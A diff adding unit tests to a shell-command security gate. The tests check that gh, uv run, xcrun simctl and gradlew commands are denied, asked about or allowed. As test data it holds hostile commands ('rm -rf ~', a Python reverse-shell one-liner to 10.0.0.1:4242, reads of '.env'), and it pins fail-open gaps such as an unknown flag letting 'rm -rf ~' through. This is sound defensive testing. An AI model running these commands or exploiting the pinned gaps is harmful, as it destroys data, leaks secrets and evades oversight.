@@ -588,6 +588,12 @@ class SecurityGateTests(unittest.TestCase):
             ("terraform apply", "T6_HIGH_RISK_TERRAFORM"),
             ("terraform apply -auto-approve", "T6_HIGH_RISK_TERRAFORM"),
             ("terraform destroy", "T6_HIGH_RISK_TERRAFORM"),
+            # gh (TK-55 F2): mutating subcommands come from the FAMILIES
+            # ask_specs, generated into T6_ASK_TABLE like any family
+            ("gh pr merge", "T6_HIGH_RISK_GH"),
+            ("gh pr create", "T6_HIGH_RISK_GH"),
+            ("gh issue create", "T6_HIGH_RISK_GH"),
+            ("gh run delete", "T6_HIGH_RISK_GH"),
             # wrappers and absolute paths still resolve through the table
             ("env kubectl delete pod x", "T6_HIGH_RISK_KUBECTL"),
             ("/usr/local/bin/terraform destroy", "T6_HIGH_RISK_TERRAFORM"),
@@ -629,6 +635,13 @@ class SecurityGateTests(unittest.TestCase):
             "terraform -destroy",
             "flutter analyze",
             "xcodebuild -scheme App build",
+            # gh (TK-55 F2): RO verbs stay allow; `run download` is in NO
+            # FAMILIES list (writes artifact files into cwd, N-F4 sibling
+            # rule) - defer on the hook path, never rewritten
+            "gh pr list",
+            "gh pr view",
+            "gh run view",
+            "gh run download",
         ]
         for cmd in allow_cases:
             with self.subTest(cmd=cmd):
@@ -661,6 +674,87 @@ class SecurityGateTests(unittest.TestCase):
         for cmd in allow_cases:
             with self.subTest(cmd=cmd):
                 self.assert_allow(cmd)
+
+    # ------------------------------------------------------------------
+    # Exec-prefix unwrapping (TK-55 F4): `uv run <argv>` and
+    # `xcrun [flags] simctl <argv>` resolve to the effective head for every
+    # check; consumed prefix tokens stay visible to token-level scans (T1).
+    # ------------------------------------------------------------------
+    def test_exec_prefix_unwrap_inner_head_denied(self):
+        self.assert_deny("uv run rm -rf ~", "T4_DESTRUCTIVE_MUTATION")
+        self.assert_deny("env uv run rm -rf ~", "T4_DESTRUCTIVE_MUTATION")
+        # Wrapper chains work in both orders (wrapper loop + prefix split
+        # iterate inside one _unwrap_tokens pass).
+        self.assert_deny("nice uv run rm -rf ~", "T4_DESTRUCTIVE_MUTATION")
+        self.assert_deny("uv run env rm -rf ~", "T4_DESTRUCTIVE_MUTATION")
+        # Parity pins: the pre-existing wrapper unwrap is unchanged.
+        self.assert_deny("env rm -rf ~", "T4_DESTRUCTIVE_MUTATION")
+        self.assert_deny("nice rm -rf ~", "T4_DESTRUCTIVE_MUTATION")
+        # T1 inline-eval vector reaches inside the prefix too.
+        self.assert_deny(
+            "uv run python3 -c 'import socket,subprocess,os;"
+            's=socket.socket();s.connect(("10.0.0.1",4242))\'',
+            "T3_OBFUSCATION_EVAL",
+        )
+
+    def test_exec_prefix_consumed_tokens_stay_visible_to_t1(self):
+        # E-009 regression pin: `--env-file .env` is consumed by the prefix
+        # split but its value must remain a scannable token (deny, as the
+        # pre-unwrap behavior already was).
+        self.assert_deny("uv run --env-file .env pytest", "T1_CREDENTIAL_ACCESS")
+        self.assert_deny(
+            "uv run --with-requirements .env pytest", "T1_CREDENTIAL_ACCESS"
+        )
+
+    def test_exec_prefix_inner_head_asks(self):
+        # T5 sees the inner package-install head.
+        self.assert_ask("uv run pip install x", "T5_SUPPLY_CHAIN")
+        self.assert_ask("uv run npx -y pkg", "T5_SUPPLY_CHAIN")
+        # T6 sees simctl behind xcrun (incl. xcrun value flags).
+        self.assert_ask("xcrun simctl erase all", "T6_HIGH_RISK_SIMCTL")
+        self.assert_ask("xcrun simctl delete abc-123", "T6_HIGH_RISK_SIMCTL")
+        self.assert_ask(
+            "xcrun --sdk macosx simctl erase all", "T6_HIGH_RISK_SIMCTL"
+        )
+
+    def test_exec_prefix_fail_open_and_allowed(self):
+        self.assert_allow("uv run pytest")
+        self.assert_allow("uv run")  # no inner command: tokens unchanged
+        # Unknown prefix flag -> no unwrap (fail-open): the head stays
+        # `uv`, so the inner `rm -rf ~` is not reached. Pinned behavior.
+        self.assert_allow("uv run --unknown-flag rm -rf ~")
+        # Parity: bare `bash -c id` is allow today (no rule owns it), so
+        # the unwrapped form is allow too - not a new gap.
+        self.assert_allow("uv run bash -c id")
+        # only_tool: generic `xcrun <tool>` stays opaque, and a non-ask
+        # simctl verb stays allow.
+        self.assert_allow("xcrun otool x")
+        self.assert_allow("xcrun simctl list")
+
+    # ------------------------------------------------------------------
+    # T6: gradlew publish-class tasks (Ask Confirmation) — TK-55 F5
+    # ------------------------------------------------------------------
+    def test_t6_gradlew_publish_class_asks(self):
+        # Custom check (not the exact-token T6 table): positional task
+        # tokens classify by the last ":"-segment, so `:app:publish` and
+        # multi-task forms are covered. basename() covers ./gradlew,
+        # bare gradlew and absolute paths.
+        self.assert_ask("./gradlew publish", "T6_HIGH_RISK_GRADLEW")
+        self.assert_ask("./gradlew :app:publish", "T6_HIGH_RISK_GRADLEW")
+        self.assert_ask("./gradlew test publish", "T6_HIGH_RISK_GRADLEW")
+        self.assert_ask("./gradlew clean", "T6_HIGH_RISK_GRADLEW")
+        self.assert_ask("gradlew publish", "T6_HIGH_RISK_GRADLEW")
+        self.assert_ask("/opt/w/gradlew publish", "T6_HIGH_RISK_GRADLEW")
+
+    def test_t6_gradlew_ro_and_unknown_allowed(self):
+        self.assert_allow("./gradlew test")
+        self.assert_allow("./gradlew :app:assembleDebug")
+        self.assert_allow("./gradlew :app:assembleDebug --console=plain")
+        self.assert_allow("./gradlew --tests FooTest test")
+        # Unknown tasks defer to the rewriter (never rewrites them) and
+        # the native permission layer - fail-open, not ask.
+        self.assert_allow("./gradlew unknownVerb")
+        self.assert_allow("./gradlew --unknown-flag test")
 
     # ------------------------------------------------------------------
     # T7: Action Space Backstop (§26a core-rules)
